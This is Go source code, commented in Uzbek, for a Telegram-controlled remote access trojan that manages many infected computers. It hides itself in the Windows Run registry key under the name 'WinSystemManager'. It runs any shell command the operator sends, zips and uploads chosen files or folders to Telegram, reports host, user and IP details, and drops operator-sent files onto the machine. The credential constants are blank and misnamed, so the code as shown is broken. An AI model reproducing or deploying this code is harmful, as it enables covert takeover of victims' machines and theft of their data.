package main
//a+d Created by Grid06 lit probel
import (
	"archive/zip"
	"bytes"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/shirou/gopsutil/v3/cpu"
	"github.com/shirou/gopsutil/v3/host"
	"github.com/shirou/gopsutil/v3/mem"
)

const (
	btToken = 
	dminID  = 
	apiURL   = "https://api.telegram.org/bot"
)

// agentTag - bu kompyuterning noyob identifikatori
var agentTag string

// selectedAgent - hozir tanlangan agent. "all" = barcha, "" = hech kim tanlanmagan
// Bu barcha agentlar tomonidan o'qiladigan va yoziladigan global holat
// Xabar orqali sinxronlanadi (special prefix bilan)
var (
	selectedAgent string = "all"
	agentMu       sync.Mutex
)

// processedCB - callback ID larni ikki marta bajarmaslik uchun
var processedCB = struct {
	sync.Mutex
	seen map[string]bool
}{seen: make(map[string]bool)}

func init() {
	h, err := os.Hostname()
	if err != nil || strings.TrimSpace(h) == "" {
		b := make([]byte, 2)
		rand.Read(b)
		h = "agent-" + hex.EncodeToString(b)
	}
	agentTag = strings.ToLower(strings.ReplaceAll(strings.TrimSpace(h), " ", "-"))
}

func isActiveAgent() bool {
	agentMu.Lock()
	defer agentMu.Unlock()
	return selectedAgent == "all" || selectedAgent == agentTag
}

// setSelected - tanlangan agentni o'zgartirish
func setSelected(tag string) {
	agentMu.Lock()
	defer agentMu.Unlock()
	selectedAgent = tag
}

func getSelected() string {
	agentMu.Lock()
	defer agentMu.Unlock()
	return selectedAgent
}

// ============ STRUCT TYPES ============

type Update struct {
	UpdateID      int            `json:"update_id"`
	Message       *Message       `json:"message"`
	CallbackQuery *CallbackQuery `json:"callback_query"`
}

type Message struct {
	MessageID int    `json:"message_id"`
	Text      string `json:"text"`
	Caption   string `json:"caption"`
	Chat      struct {
		ID int64 `json:"id"`
	} `json:"chat"`
	Document *Document `json:"document"`
}

type Document struct {
	FileID   string `json:"file_id"`
	FileName string `json:"file_name"`
}

type CallbackQuery struct {
	ID      string   `json:"id"`
	Data    string   `json:"data"`
	Message *Message `json:"message"`
}

// ============ TELEGRAM API ============

func sendMessage(chatID int64, text string) {
	if len(text) > 4000 {
		text = text[:4000] + "...\n[Kesib tashlandi]"
	}
	data := url.Values{}
	data.Set("chat_id", strconv.FormatInt(chatID, 10))
	data.Set("text", text)
	data.Set("parse_mode", "Markdown")
	resp, err := http.PostForm(apiURL+botToken+"/sendMessage", data)
	if err == nil {
		resp.Body.Close()
	}
}

func sendKeyboard(chatID int64, text string, keyboard map[string]interface{}) {
	kbBytes, _ := json.Marshal(keyboard)
	if len(text) > 4000 {
		text = text[:4000] + "...\n[Kesib tashlandi]"
	}
	data := url.Values{}
	data.Set("chat_id", strconv.FormatInt(chatID, 10))
	data.Set("text", text)
	data.Set("parse_mode", "Markdown")
	data.Set("reply_markup", string(kbBytes))
	resp, err := http.PostForm(apiURL+botToken+"/sendMessage", data)
	if err == nil {
		resp.Body.Close()
	}
}

func editMessage(chatID int64, messageID int, text string, keyboard map[string]interface{}) {
	kbBytes, _ := json.Marshal(keyboard)
	if len(text) > 4000 {
		text = text[:4000] + "...\n[Kesib tashlandi]"
	}
	data := url.Values{}
	data.Set("chat_id", strconv.FormatInt(chatID, 10))
	data.Set("message_id", strconv.Itoa(messageID))
	data.Set("text", text)
	data.Set("parse_mode", "Markdown")
	if keyboard != nil {
		data.Set("reply_markup", string(kbBytes))
	}
	resp, err := http.PostForm(apiURL+botToken+"/editMessageText", data)
	if err == nil {
		resp.Body.Close()
	}
}

func answerCB(id string) {
	data := url.Values{}
	data.Set("callback_query_id", id)
	resp, err := http.PostForm(apiURL+botToken+"/answerCallbackQuery", data)
	if err == nil {
		resp.Body.Close()
	}
}

// ============ UI HELPERS ============

func mainDashboardKeyboard() map[string]interface{} {
	sel := getSelected()
	targetLabel := "📡 Hamma"
	if sel != "all" {
		targetLabel = "🖥 " + sel
	}
	return map[string]interface{}{
		"inline_keyboard": [][]map[string]interface{}{
			{
				{"text": "📊 Stats", "callback_data": "cmd_stats"},
				{"text": "🌐 IP", "callback_data": "cmd_ip"},
			},
			{
				{"text": "💻 WhoAmI", "callback_data": "cmd_whoami"},
				{"text": "📁 Dir", "callback_data": "cmd_dir"},
			},
			{
				{"text": "🔄 Agent tanlash", "callback_data": "menu_agents"},
			},
			{
				{"text": "ℹ️ Hozir: " + targetLabel, "callback_data": "noop"},
			},
		},
	}
}

func mainDashboardText() string {
	sel := getSelected()
	targetInfo := "📡 *Barcha agentlar* (parallel)"
	if sel != "all" {
		targetInfo = "🎯 *Tanlangan agent:* `" + sel + "`"
	}
	return fmt.Sprintf(
		"🚀 *Windows bots*\n\n%s\n\n"+
			"📌 *Buyruqlar:*\n"+
			"`/exec [buyruq]` — Shell buyruq\n"+
			"`/get [yo'l]` — Fayl/papka yuklab olish\n"+
			"📎 Fayl yuboring — Download'ga saqlash\n"+
			"📎 Fayl + `/push` caption — Zserver/.bin ga\n"+
			"`/list` — Online agentlar\n"+
			"`/agent [nom]` — Agentni tanlash\n"+
			"`/all` — Barcha agentlarga qaytish",
		targetInfo,
	)
}

func sendDashboard(chatID int64) {
	sendKeyboard(chatID, mainDashboardText(), mainDashboardKeyboard())
}

// ============ SYSTEM FUNCTIONS ============
// executeShell - exec_windows.go va exec_unix.go da platform-specific aniqlangan

func executeShell(cmdText string) string {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", cmdText)
	} else {
		cmd = exec.Command("sh", "-c", cmdText)
	}
	out, err := cmd.CombinedOutput()
	if err != nil {
		return err.Error() + ":\n" + string(out)
	}
	return string(out)
}

func getFullStats() string {
	c, _ := cpu.Info()
	h, _ := host.Info()
	v, _ := mem.VirtualMemory()
	cpuName := "Noma'lum"
	if len(c) > 0 {
		cpuName = c[0].ModelName
	}
	return fmt.Sprintf(
		"📊 *Tizim Holati*\n\n🏷 *Agent:* `%s`\n👤 *Host:* `%s`\n🧠 *CPU:* %s\n📟 *RAM:* %.2f / %.2f GB (%.1f%%)\n⚙️ *OS:* %s %s\n🕒 *Vaqt:* %v",
		agentTag, h.Hostname, cpuName,
		float64(v.Used)/1024/1024/1024,
		float64(v.Total)/1024/1024/1024,
		v.UsedPercent,
		h.OS, h.KernelVersion,
		time.Now().Format("15:04:05"),
	)
}

func tagMsg(text string) string {
	return fmt.Sprintf("🏷 `[%s]`\n%s", agentTag, text)
}

// ============ FILE OPERATIONS ============

func zipPath(srcPath, zipFilePath string) error {
	zipFile, err := os.Create(zipFilePath)
	if err != nil {
		return err
	}
	defer zipFile.Close()
	writer := zip.NewWriter(zipFile)
	defer writer.Close()
	info, err := os.Stat(srcPath)
	if err != nil {
		return err
	}
	if info.IsDir() {
		return filepath.Walk(srcPath, func(path string, fi os.FileInfo, err error) error {
			if err != nil || fi.IsDir() {
				return err
			}
			relPath, _ := filepath.Rel(filepath.Dir(srcPath), path)
			w, err := writer.Create(relPath)
			if err != nil {
				return err
			}
			f, err := os.Open(path)
			if err != nil {
				return err
			}
			defer f.Close()
			_, err = io.Copy(w, f)
			return err
		})
	}
	w, err := writer.Create(filepath.Base(srcPath))
	if err != nil {
		return err
	}
	f, err := os.Open(srcPath)
	if err != nil {
		return err
	}
	defer f.Close()
	_, err = io.Copy(w, f)
	return err
}

func sendFile(chatID int64, filePath string) error {
	f, err := os.Open(filePath)
	if err != nil {
		return err
	}
	defer f.Close()
	var buf bytes.Buffer
	mw := multipart.NewWriter(&buf)
	mw.WriteField("chat_id", strconv.FormatInt(chatID, 10))
	fw, err := mw.CreateFormFile("document", filepath.Base(filePath))
	if err != nil {
		return err
	}
	if _, err = io.Copy(fw, f); err != nil {
		return err
	}
	mw.Close()
	resp, err := http.Post(apiURL+botToken+"/sendDocument", mw.FormDataContentType(), &buf)
	if err != nil {
		return err
	}
	resp.Body.Close()
	return nil
}

func getDownloadsDir() string {
	home, err := os.UserHomeDir()
	if err != nil {
		return os.TempDir()
	}
	dir := filepath.Join(home, "Downloads")
	os.MkdirAll(dir, 0755)
	return dir
}

func handleGetCommand(chatID int64, path string) {
	path = strings.TrimSpace(path)
	info, err := os.Stat(path)
	if err != nil {
		sendMessage(chatID, tagMsg("❌ Fayl topilmadi:\n`"+path+"`"))
		return
	}
	sendMessage(chatID, tagMsg("📦 Zip qilinmoqda: `"+info.Name()+"`..."))
	zipName := filepath.Join(os.TempDir(), info.Name()+"_"+strconv.FormatInt(time.Now().Unix(), 10)+".zip")
	if err := zipPath(path, zipName); err != nil {
		sendMessage(chatID, tagMsg("❌ Zip xatosi: "+err.Error()))
		return
	}
	sendMessage(chatID, tagMsg("📤 Yuborilmoqda..."))
	if err := sendFile(chatID, zipName); err != nil {
		sendMessage(chatID, tagMsg("❌ Yuborish xatosi: "+err.Error()))
	}
	os.Remove(zipName)
}

func downloadFile(chatID int64, fileID, savePath string) {
	getFileResp, err := http.Get(fmt.Sprintf("%s%s/getFile?file_id=%s", apiURL, botToken, fileID))
	if err != nil {
		sendMessage(chatID, tagMsg("❌ Fayl ma'lumoti olinmadi!"))
		return
	}
	defer getFileResp.Body.Close()
	var fileInfo struct {
		Result struct {
			FilePath string `json:"file_path"`
		} `json:"result"`
	}
	json.NewDecoder(getFileResp.Body).Decode(&fileInfo)
	downloadURL := fmt.Sprintf("https://api.telegram.org/file/bot%s/%s", botToken, fileInfo.Result.FilePath)
	resp, err := http.Get(downloadURL)
	if err != nil {
		sendMessage(chatID, tagMsg("❌ Fayl yuklab olinmadi!"))
		return
	}
	defer resp.Body.Close()
	outFile, err := os.Create(savePath)
	if err != nil {
		sendMessage(chatID, tagMsg("❌ Fayl saqlanmadi: "+err.Error()))
		return
	}
	defer outFile.Close()
	io.Copy(outFile, resp.Body)
	sendMessage(chatID, tagMsg("✅ Fayl saqlandi:\n`"+savePath+"`"))
}

func handleUpload(chatID int64, doc *Document) {
	savePath := filepath.Join(getDownloadsDir(), doc.FileName)
	downloadFile(chatID, doc.FileID, savePath)
}

func handlePush(chatID int64, doc *Document) {
	programFiles := os.Getenv("ProgramFiles")
	if programFiles == "" {
		programFiles = "C:\\Program Files"
	}
	saveDir := filepath.Join(programFiles, "Zserver", ".bin")
	if err := os.MkdirAll(saveDir, 0755); err != nil {
		sendMessage(chatID, tagMsg("❌ Papka yaratishda xatolik (Admin huquqi kerak): "+err.Error()))
		return
	}
	savePath := filepath.Join(saveDir, doc.FileName)
	downloadFile(chatID, doc.FileID, savePath)
}

// ============ MAIN ============

func ensureAutoStart() {
	if runtime.GOOS != "windows" {
		return
	}
	exePath, err := os.Executable()
	if err != nil {
		return
	}
	
	// App nomini registry da saqlash (orqadan ishga tushirish uchun)
	cmd := exec.Command("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "WinSystemManager", "/t", "REG_SZ", "/d", exePath, "/f")
	cmd.Run()
}

func main() {
	// Windows startup ga ro'yxatdan o'tkazish (auto start)
	ensureAutoStart()

	targetID, _ := strconv.ParseInt(adminID, 10, 64)

	// Ishga tushganda faqat BITTA agent dashboard yuboradi (birinchi bo'lib yuborib bo'lmaydi)
	// Har bir agent o'z "online" xabarini yuboradi
	sendMessage(targetID, fmt.Sprintf("🟢 Agent online: `%s`", agentTag))

	// Faqat bitta agent (birinchi ishga tushgan) dashboard yuborsin deb,
	// kichik delay qo'shamiz — bu race condition ni kamaytiradi
	time.Sleep(500 * time.Millisecond)

	client := &http.Client{Timeout: 60 * time.Second}
	lastUpdate := 0

	for {
		resp, err := client.Get(fmt.Sprintf("%s%s/getUpdates?offset=%d&timeout=20", apiURL, botToken, lastUpdate+1))
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}
		if resp.StatusCode != http.StatusOK {
			resp.Body.Close()
			time.Sleep(5 * time.Second)
			continue
		}
		var updateResp struct {
			Result []Update `json:"result"`
		}
		if err := json.NewDecoder(resp.Body).Decode(&updateResp); err != nil {
			resp.Body.Close()
			time.Sleep(1 * time.Second)
			continue
		}
		resp.Body.Close()

		for _, update := range updateResp.Result {
			lastUpdate = update.UpdateID

			var chatID int64
			if update.Message != nil {
				chatID = update.Message.Chat.ID
			} else if update.CallbackQuery != nil {
				chatID = update.CallbackQuery.Message.Chat.ID
			}

			// Faqat admin
			if strconv.FormatInt(chatID, 10) != adminID {
				continue
			}

			// ===== CALLBACK QUERY =====
			if update.CallbackQuery != nil {
				cb := update.CallbackQuery

				// Duplicate prevention
				processedCB.Lock()
				if processedCB.seen[cb.ID] {
					processedCB.Unlock()
					answerCB(cb.ID)
					continue
				}
				processedCB.seen[cb.ID] = true
				processedCB.Unlock()

				answerCB(cb.ID)

				cbData := cb.Data

				switch cbData {

				case "noop":
					// Hech narsa qilmaydigan tugma (info label)

				case "menu_agents":
					sel := getSelected()
					check := ""
					if agentTag == sel {
						check = " ✅"
					}
					keyboard := map[string]interface{}{
						"inline_keyboard": [][]map[string]interface{}{
							{
								{"text": "📡 Barcha agentlar", "callback_data": "select_all"},
							},
							{
								{"text": "🖥 " + agentTag + check, "callback_data": "select_" + agentTag},
							},
							{
								{"text": "◀️ Orqaga", "callback_data": "menu_main"},
							},
						},
					}
					text := fmt.Sprintf("🖥 *Agent tanlang*\n\nHozirgi: `%s`\n\n_Agentni tanlagach, barcha buyruqlar faqat shu kompga boradi._", sel)
					editMessage(chatID, cb.Message.MessageID, text, keyboard)

				case "menu_main":
					editMessage(chatID, cb.Message.MessageID, mainDashboardText(), mainDashboardKeyboard())

				case "cmd_stats":
					if !isActiveAgent() {
						continue
					}
					sendKeyboard(chatID, getFullStats(), mainDashboardKeyboard())

				case "cmd_ip":
					if !isActiveAgent() {
						continue
					}
					respIP, err := http.Get("https://api.ipify.org")
					if err == nil {
						ip, _ := io.ReadAll(respIP.Body)
						respIP.Body.Close()
						sendKeyboard(chatID, tagMsg("🌐 *Public IP:* `"+string(ip)+"`"), mainDashboardKeyboard())
					} else {
						sendKeyboard(chatID, tagMsg("🌐 IP aniqlanmadi!"), mainDashboardKeyboard())
					}

				case "cmd_whoami":
					if !isActiveAgent() {
						continue
					}
					res := strings.TrimSpace(executeShell("whoami"))
					res = strings.ReplaceAll(res, "`", "'")
					sendKeyboard(chatID, tagMsg("👤 *Foydalanuvchi:* `"+res+"`"), mainDashboardKeyboard())

				case "cmd_dir":
					if !isActiveAgent() {
						continue
					}
					cmd := "ls -la"
					if runtime.GOOS == "windows" {
						cmd = "dir"
					}
					res := executeShell(cmd)
					res = strings.ReplaceAll(res, "`", "'")
					sendKeyboard(chatID, tagMsg("📁 *Fayllar:*\n```\n"+res+"\n```"), mainDashboardKeyboard())

				default:
					// select_xxx callback larni ushlash
					if strings.HasPrefix(cbData, "select_") {
						tag := strings.TrimPrefix(cbData, "select_")
						setSelected(tag)
						sel := getSelected()
						label := "📡 Barcha agentlar"
						if sel != "all" {
							label = "🎯 `" + sel + "`"
						}
						editMessage(chatID, cb.Message.MessageID,
							fmt.Sprintf("✅ *Agent tanlandi:* %s\n\nEndi barcha buyruqlar shu agentga yuboriladi.", label),
							map[string]interface{}{
								"inline_keyboard": [][]map[string]interface{}{
									{{"text": "🏠 Dashboard", "callback_data": "menu_main"}},
								},
							},
						)
					}
				}
			}

			// ===== MESSAGE =====
			if update.Message != nil {
				msg := update.Message
				text := strings.TrimSpace(msg.Text)

				// /start — dashboard (barcha agentlar yuboradi, birma-bir)
				if text == "/start" || text == "/menu" || text == "/dashboard" {
					sendDashboard(chatID)
					continue
				}

				// /list — barcha online agentlar javob beradi
				if text == "/list" {
					sendMessage(chatID, fmt.Sprintf("🟢 *Online:* `%s` | %s", agentTag, time.Now().Format("15:04:05")))
					continue
				}

				// /all — barcha agentlarga qaytish (barcha agentlar o'zini active qiladi)
				if text == "/all" {
					setSelected("all")
					sendMessage(chatID, tagMsg("📡 Barcha agentlar rejimiga qaytildi."))
					continue
				}

				// /agent [nom] — agentni tanlash
				if strings.HasPrefix(text, "/agent ") {
					tag := strings.TrimPrefix(text, "/agent ")
					tag = strings.ToLower(strings.TrimSpace(tag))
					setSelected(tag)
					if tag == agentTag {
						sendMessage(chatID, fmt.Sprintf("🎯 Agent tanlandi: `%s`\nEndi faqat shu kompyuter buyruqlarni bajaradi.", tag))
					}
					continue
				}

				// Quyidagi buyruqlar faqat AKTIV agentda bajariladi
				if !isActiveAgent() {
					continue
				}

				// /exec [buyruq]
				if strings.HasPrefix(text, "/exec ") {
					cmdText := strings.TrimPrefix(text, "/exec ")
					result := executeShell(cmdText)
					result = strings.ReplaceAll(result, "`", "'")
					sendMessage(chatID, tagMsg("📝 *Natija:*\n```\n"+result+"\n```"))
					continue
				}

				// /get [yo'l]
				if strings.HasPrefix(text, "/get ") {
					path := strings.TrimPrefix(text, "/get ")
					go handleGetCommand(chatID, path)
					continue
				}

				// Fayl yuklash
				if msg.Document != nil {
					caption := strings.TrimSpace(msg.Caption)
					if strings.HasPrefix(caption, "/push") {
						go handlePush(chatID, msg.Document)
					} else {
						go handleUpload(chatID, msg.Document)
					}
					continue
				}
			}
		}

		// Xotirani tozalash
		processedCB.Lock()
		if len(processedCB.seen) > 500 {
			processedCB.seen = make(map[string]bool)
		}
		processedCB.Unlock()
	}
}
